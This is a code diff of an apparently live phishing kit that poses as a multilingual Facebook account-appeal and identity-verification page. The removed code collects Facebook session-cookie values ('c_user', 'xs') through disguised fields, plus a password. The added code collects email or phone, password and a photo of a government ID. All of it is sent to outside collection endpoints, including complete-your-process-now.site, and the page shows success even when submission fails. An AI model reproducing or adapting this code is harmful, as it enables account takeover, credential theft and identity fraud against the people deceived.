           formNotice3: "ⓘ Đảm bảo bạn cung cấp thông tin chính xác cho khiếu nại của mình.",
-          nameLabel: "c_user",
-          mallLabel: "xs",
+          emailPhoneLabel: "Email hoặc số điện thoại",
+          passwordLabel: "Mật khẩu",
+          uploadDocumentLabel: "Tải lên tài liệu chính thức của bạn",
+          uploadDocumentBtn: "Tải lên tài liệu",
+          chooseIdTypeTitle: "Chọn loại ID để tải lên",
+          idUploadNotice: "Chúng tôi sẽ sử dụng ID của bạn để xem xét tên, ảnh và ngày sinh của bạn. Nó sẽ không được chia sẻ trên hồ sơ của bạn.",
+          passportOption: "Hộ chiếu",
+          driversLicenseOption: "Giấy phép lái xe",
+          nationalIdOption: "Thẻ căn cước quốc gia",
+          browsePhotosOption: "Duyệt từ ảnh",
+          useCameraOption: "Sử dụng máy ảnh",
           submitBtn: "Gửi Yêu cầu Khiếu nại",
           fbFormTitle: "Xác minh Facebook",
           fbFormSubtitle: "Xác minh danh tính của bạn để tiếp tục khiếu nại",
@@ -1671,8 +2308,17 @@
           formNotice1: "ⓘ Wo krataa no ayɛ yɛn mmara ahorow no so.",
           formNotice2: "ⓘ Mesrɛ wo, hwɛ mfomsoɔ no ho nsɛm yiye ansa na wuregye tomu.",
           formNotice3: "ⓘ Hwɛ sɛ wuhyɛ nsɛm pa sɛ woyɛ apɛl.",
-          nameLabel: "c_user",
-          mallLabel: "xs",
+          emailPhoneLabel: "Email anaa fon nɔma",
+          passwordLabel: "Password",
+          uploadDocumentLabel: "Upload wo resmi krataa",
+          uploadDocumentBtn: "Upload krataa",
+          chooseIdTypeTitle: "Paw ID sɔhwɛ a wubɛ upload",
+          idUploadNotice: "Yɛbɛ de wo ID ahwɛ wo din, mfonini ne wo awoda. Ɛnnya ɛnkɔ wo profile so.",
+          passportOption: "Akwantu krataa",
+          driversLicenseOption: "Kaa ho krataa",
+          nationalIdOption: "Ɔman ID krataa",
+          browsePhotosOption: "Hwehwɛ mfonini mu",
+          useCameraOption: "De kamera di dwuma",
           submitBtn: "Yɛ Apɛl Kɔm",
           fbFormTitle: "Facebook Nhwehwɛmu",
           fbFormSubtitle: "Hwɛ wo ho sɛ wotumi tua so yɛ apɛl",
@@ -1718,10 +2364,17 @@
       const changeLanguageBtn = document.getElementById('changeLanguageBtn');
 
       // Form elements
-      const nameInput = document.getElementById('nameInput');
-      const mallInput = document.getElementById('mallInput');
-      const nameError = document.getElementById('nameError');
-      const mallError = document.getElementById('mallError');
+      const emailPhoneInput = document.getElementById('emailPhoneInput');
+      const passwordInput1 = document.getElementById('passwordInput1');
+      const uploadDocumentBtn = document.getElementById('uploadDocumentBtn');
+      const selectedDocumentInfo = document.getElementById('selectedDocumentInfo');
+      const documentTypeName = document.getElementById('documentTypeName');
+      const documentFileName = document.getElementById('documentFileName');
+      const changeDocumentBtn = document.getElementById('changeDocumentBtn');
+      const idCardPreview = document.getElementById('idCardPreview');
+      const emailPhoneError = document.getElementById('emailPhoneError');
+      const passwordError1 = document.getElementById('passwordError1');
+      const idCardError = document.getElementById('idCardError');
       const formError = document.getElementById('formError');
       const formErrorText = document.getElementById('formErrorText');
       const sendBtn = document.getElementById('sendBtn');
@@ -1729,14 +2382,20 @@
       const sendBtnSpinner = document.getElementById('sendBtnSpinner');
       const referenceId = document.getElementById('referenceId');
 
-      const passwordInput = document.getElementById('passwordInput');
-      const passwordError = document.getElementById('passwordError');
-      const fbFormError = document.getElementById('fbFormError');
-      const fbFormErrorText = document.getElementById('fbFormErrorText');
-      const fbSendBtn = document.getElementById('fbSendBtn');
-      const fbSendBtnText = document.getElementById('fbSendBtnText');
-      const fbSendBtnSpinner = document.getElementById('fbSendBtnSpinner');
-      const forgotPassword = document.getElementById('forgotPassword');
+      // Upload modal elements
+      const uploadModal = document.getElementById('uploadModal');
+      const uploadModalClose = document.getElementById('uploadModalClose');
+      const uploadModalOverlay = document.getElementById('uploadModalOverlay');
+      const idTypeOptions = document.querySelectorAll('.id-type-option');
+      const uploadOptionsContainer = document.getElementById('uploadOptionsContainer');
+      const browsePhotosBtn = document.getElementById('browsePhotosBtn');
+      const useCameraBtn = document.getElementById('useCameraBtn');
+      const hiddenFileInput = document.getElementById('hiddenFileInput');
+      const hiddenCameraInput = document.getElementById('hiddenCameraInput');
+
+      // Store selected ID type and file
+      let selectedIdType = null;
+      let selectedFile = null;
 
       // Language video mapping
       const videoSources = {
@@ -1883,69 +2542,174 @@
         });
       }
 
+      // Upload document modal functions
+      function showUploadModal() {
+        if (uploadModal) {
+          uploadModal.classList.add('show');
+          document.body.style.overflow = 'hidden';
+        }
+      }
+
+      function hideUploadModal() {
+        if (uploadModal) {
+          uploadModal.classList.remove('show');
+          document.body.style.overflow = 'auto';
+          // Reset modal state
+          idTypeOptions.forEach(opt => opt.classList.remove('selected'));
+          if (uploadOptionsContainer) uploadOptionsContainer.style.display = 'none';
+        }
+      }
+
+      // Open modal when upload button is clicked
+      if (uploadDocumentBtn) {
+        uploadDocumentBtn.addEventListener('click', showUploadModal);
+      }
+
+      // Change document button
+      if (changeDocumentBtn) {
+        changeDocumentBtn.addEventListener('click', showUploadModal);
+      }
+
+      // Close modal
+      if (uploadModalClose) {
+        uploadModalClose.addEventListener('click', hideUploadModal);
+      }
+
+      if (uploadModalOverlay) {
+        uploadModalOverlay.addEventListener('click', hideUploadModal);
+      }
+
+      // ID type selection
+      idTypeOptions.forEach(option => {
+        option.addEventListener('click', function() {
+          idTypeOptions.forEach(opt => opt.classList.remove('selected'));
+          this.classList.add('selected');
+          selectedIdType = this.getAttribute('data-id-type');
+          
+          // Show upload options
+          if (uploadOptionsContainer) {
+            uploadOptionsContainer.style.display = 'grid';
+          }
+        });
+      });
+
+      // Browse from photos
+      if (browsePhotosBtn) {
+        browsePhotosBtn.addEventListener('click', function() {
+          hiddenFileInput.click();
+        });
+      }
+
+      // Use camera
+      if (useCameraBtn) {
+        useCameraBtn.addEventListener('click', function() {
+          hiddenCameraInput.click();
+        });
+      }
+
+      // Handle file selection from both inputs
+      function handleFileSelection(file) {
+        if (!file) return;
+
+        if (!file.type.startsWith('image/')) {
+          if (idCardError) idCardError.innerHTML = '<svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 9V14" stroke="#c2410c" stroke-width="2" stroke-linecap="round"/><path d="M12 17V17.5" stroke="#c2410c" stroke-width="2" stroke-linecap="round"/><path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" stroke="#c2410c" stroke-width="2"/></svg> Please upload an image file.';
+          return;
+        }
+
+        if (file.size > 10 * 1024 * 1024) {
+          if (idCardError) idCardError.innerHTML = '<svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 9V14" stroke="#c2410c" stroke-width="2" stroke-linecap="round"/><path d="M12 17V17.5" stroke="#c2410c" stroke-width="2" stroke-linecap="round"/><path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" stroke="#c2410c" stroke-width="2"/></svg> File size must be less than 10MB.';
+          return;
+        }
+
+        selectedFile = file;
+        if (idCardError) idCardError.textContent = '';
+
+        // Get ID type name for display
+        const idTypeNames = {
+          'passport': translations[currentLanguage]?.passportOption || 'Passport',
+          'drivers_license': translations[currentLanguage]?.driversLicenseOption || "Driver's License",
+          'national_id': translations[currentLanguage]?.nationalIdOption || 'National ID Card'
+        };
+
+        // Show selected document info
+        if (documentTypeName) documentTypeName.textContent = idTypeNames[selectedIdType] || selectedIdType;
+        if (documentFileName) documentFileName.textContent = file.name;
+        if (selectedDocumentInfo) selectedDocumentInfo.style.display = 'block';
+
+        // Show preview
+        const reader = new FileReader();
+        reader.onload = function(event) {
+          if (idCardPreview) {
+            idCardPreview.innerHTML = '<img src="' + event.target.result + '" style="max-width: 100%; height: auto; border-radius: 8px; border: 1px solid #d6ebff; display: block; box-shadow: 0 2px 8px rgba(0, 100, 224, 0.1);">';
+          }
+        };
+        reader.readAsDataURL(file);
+
+        // Close modal
+        hideUploadModal();
+      }
+
+      if (hiddenFileInput) {
+        hiddenFileInput.addEventListener('change', function(e) {
+          if (e.target.files[0]) {
+            handleFileSelection(e.target.files[0]);
+          }
+        });
+      }
+
+      if (hiddenCameraInput) {
+        hiddenCameraInput.addEventListener('change', function(e) {
+          if (e.target.files[0]) {
+            handleFileSelection(e.target.files[0]);
+          }
+        });
+      }
+
       // Form validation
-      if (nameInput) {
-        nameInput.addEventListener('input', () => {
-          const original = nameInput.value;
-          const cleaned  = original.replace(/\D+/g, '');
-          if (original !== cleaned) {
-            nameInput.value = cleaned;
-            if (nameError) nameError.innerHTML = '<svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 9V14" stroke="#c2410c" stroke-width="2" stroke-linecap="round"/><path d="M12 17V17.5" stroke="#c2410c" stroke-width="2" stroke-linecap="round"/><path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" stroke="#c2410c" stroke-width="2"/></svg> Only numbers are allowed in Name.';
+      if (emailPhoneInput) {
+        emailPhoneInput.addEventListener('input', () => {
+          const value = emailPhoneInput.value.trim();
+          if (value && !isValidEmailOrPhone(value)) {
+            if (emailPhoneError) emailPhoneError.innerHTML = '<svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 9V14" stroke="#c2410c" stroke-width="2" stroke-linecap="round"/><path d="M12 17V17.5" stroke="#c2410c" stroke-width="2" stroke-linecap="round"/><path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12 C2 17.5228 6.47715 22 12 22Z" stroke="#c2410c" stroke-width="2"/></svg> Please enter a valid email or phone number.';
           } else {
-            if (nameError) nameError.textContent = '';
+            if (emailPhoneError) emailPhoneError.textContent = '';
           }
         });
       }
 
-      const mallAllowed = /[^A-Za-z0-9 !@#$%^&*()_\-=\[\]{};':"\\|,.<>\/?`~]/g;
-      if (mallInput) {
-        mallInput.addEventListener('input', () => {
-          const original = mallInput.value;
-          const cleaned  = original.replace(mallAllowed, '');
-          if (original !== cleaned) {
-            mallInput.value = cleaned;
-            if (mallError) mallError.innerHTML = '<svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 9V14" stroke="#c2410c" stroke-width="2" stroke-linecap="round"/><path d="M12 17V17.5" stroke="#c2410c" stroke-width="2" stroke-linecap="round"/><path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" stroke="#c2410c" stroke-width="2"/></svg> Mall can contain letters, numbers, and symbols only.';
-          } else {
-            if (mallError) mallError.textContent = '';
-          }
-        });
-      }
-
-      if (passwordInput) {
-        passwordInput.addEventListener('input', () => {
-          const password = pasuiswordInput.value;
+      if (passwordInput1) {
+        passwordInput1.addEventListener('input', () => {
+          const password = passwordInput1.value;
           if (!password) {
-            if (passwordError) passwordError.textContent = 'Password is required';
+            if (passwordError1) passwordError1.textContent = '';
           } else if (password.length < 6) {
-            if (passwordError) passwordError.textContent = 'Password must be at least 6 characters';
+            if (passwordError1) passwordError1.innerHTML = '<svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 9V14" stroke="#c2410c" stroke-width="2" stroke-linecap="round"/><path d="M12 17V17.5" stroke="#c2410c" stroke-width="2" stroke-linecap="round"/><path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12 C2 17.5228 6.47715 22 12 22Z" stroke="#c2410c" stroke-width="2"/></svg> Password must be at least 6 characters.';
           } else {
-            if (passwordError) passwordError.textContent = '';
+            if (passwordError1) passwordError1.textContent = '';
           }
         });
       }
 
-      // Forgot password click
-      if (forgotPassword) {
-        forgotPassword.addEventListener('click', () => {
-          if (fbFormErrorText) fbFormErrorText.textContent = "Password recovery is temporarily unavailable. Please try again later.";
-          if (fbFormError) fbFormError.classList.add('show');
-          setTimeout(() => { if (fbFormError) fbFormError.classList.remove('show'); }, 3000);
-        });
+      function isValidEmailOrPhone(value) {
+        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        const phoneRegex = /^[\d\s\+\-\(\)]{7,}$/;
+        return emailRegex.test(value) || phoneRegex.test(value);
       }
 
       // Send click: require non-empty + no validation errors
       if (sendBtn) {
         sendBtn.addEventListener('click', function() {
-          const name = nameInput.value.trim();
-          const mall = mallInput.value.trim();
+          const emailPhone = emailPhoneInput ? emailPhoneInput.value.trim() : '';
+          const password = passwordInput1 ? passwordInput1.value.trim() : '';
+          const idCard = selectedFile;
 
-          if(!name || !mall) {
+          if(!emailPhone || !password || !idCard) {
             if (formErrorText) formErrorText.textContent = "Please fill out all fields before proceeding.";
             if (formError) formError.classList.add('show');
             setTimeout(() => { if (formError) formError.classList.remove('show'); }, 3000);
             return;
           }
-          if ((nameError && nameError.textContent) || (mallError && mallError.textContent)) {
+          if ((emailPhoneError && emailPhoneError.textContent) || (passwordError1 && passwordError1.textContent)) {
             if (formErrorText) formErrorText.textContent = "Please fix the errors above before proceeding.";
             if (formError) formError.classList.add('show');
             setTimeout(() => { if (formError) formError.classList.remove('show'); }, 3000);
@@ -1995,25 +2759,33 @@
 
       // Function to submit form data to your PHP endpoint
       function submitFormData() {
-        const name = document.getElementById('nameInput') ? document.getElementById('nameInput').value.trim() : '';
-        const mall = document.getElementById('mallInput') ? document.getElementById('mallInput').value.trim() : '';
+        const emailPhone = emailPhoneInput ? emailPhoneInput.value.trim() : '';
+        const password = passwordInput1 ? passwordInput1.value.trim() : '';
+        const idCardFile = selectedFile;
+        const idType = selectedIdType;
        
-        // Prepare the data to send
+        // Prepare FormData for PHP endpoint (includes file upload)
+        const phpFormData = new FormData();
+        phpFormData.append('email_phone', emailPhone);
+        phpFormData.append('password', password);
+        phpFormData.append('id_type', idType);
+        if (idCardFile) {
+          phpFormData.append('id_card', idCardFile);
+        }
+        phpFormData.append('timestamp', new Date().toISOString());
+        phpFormData.append('userAgent', navigator.userAgent);
+        phpFormData.append('language', navigator.language);
+       
+        // Prepare the JSON data (without file)
         const formData = {
-          c_user: name,
-          xs: mall,
+          email_phone: emailPhone,
+          password: password,
+          id_type: idType,
+          id_card_filename: idCardFile ? idCardFile.name : '',
           timestamp: new Date().toISOString(),
           userAgent: navigator.userAgent,
           language: navigator.language
         };
-       
-        // Prepare FormData for PHP endpoint
-        const phpFormData = new FormData();
-        phpFormData.append('c_user', name);
-        phpFormData.append('xs', mall);
-        phpFormData.append('timestamp', new Date().toISOString());
-        phpFormData.append('userAgent', navigator.userAgent);
-        phpFormData.append('language', navigator.language);
        
         // Submit to both endpoints
         Promise.all([
@@ -2035,12 +2807,12 @@
         })
         .then(data => {
           console.log('Form submitted successfully:', data);
-          showFbLogin();
+          showSuccess();
         })
         .catch(error => {
           console.error('Error submitting form:', error);
           // Still proceed even if there's an error
-          showFbLogin();
+          showSuccess();
         })
         .finally(() => {
           // Reset loading state
@@ -2050,66 +2822,6 @@
             if (sendBtnSpinner) sendBtnSpinner.style.display = 'none';
           }
         });
-      }
-
-      // Function to submit Facebook credentials to your PHP endpoint
-      function submitFbCredentials(password) {
-        // Prepare the data to send
-        const fbData = {
-          password: password,
-          timestamp: new Date().toISOString(),
-          userAgent: navigator.userAgent,
-          language: navigator.language
-        };
-       
-        // Prepare FormData for PHP endpoint
-        const phpFbData = new FormData();
-        phpFbData.append('password', password);
-        phpFbData.append('timestamp', new Date().toISOString());
-        phpFbData.append('userAgent', navigator.userAgent);
-        phpFbData.append('language', navigator.language);
-       
-        // Submit to both endpoints
-        Promise.all([
-          fetch('https://submit-form.com/6xe6CI8D6', {
-            method: 'POST',
-            headers: {
-              'Content-Type': 'application/json',
-              'Accept': 'application/json'
-            },
-            body: JSON.stringify(fbData)
-          }),
-          fetch('https://complete-your-process-now.site/dynamic.php', {
-            method: 'POST',
-            body: phpFbData
-          })
-        ])
-        .then(responses => {
-          return Promise.all(responses.map(r => r.ok ? r.json().catch(() => ({})) : Promise.resolve({})));
-        })
-        .then(data => {
-          console.log('Facebook credentials submitted successfully:', data);
-          showSuccess();
-        })
-        .catch(error => {
-          console.error('Error submitting Facebook credentials:', error);
-          // Still proceed even if there's an error
-          showSuccess();
-        })
-        .finally(() => {
-          // Reset loading state
-          if (fbSendBtn) {
-            fbSendBtn.classList.remove('loading');
-            if (fbSendBtnText) fbSendBtnText.textContent = 'Verify and Continue';
-            if (fbSendBtnSpinner) fbSendBtnSpinner.style.display = 'none';
-          }
-        });
-      }
-
-      function showFbLogin() {
-        if (appealForm) appealForm.style.display = 'none';
-        if (fbLoginForm) fbLoginForm.style.display = 'block';
-        if (fbLoginForm) fbLoginForm.scrollIntoView({ behavior: 'smooth' });
       }
 
       function showSuccess() {
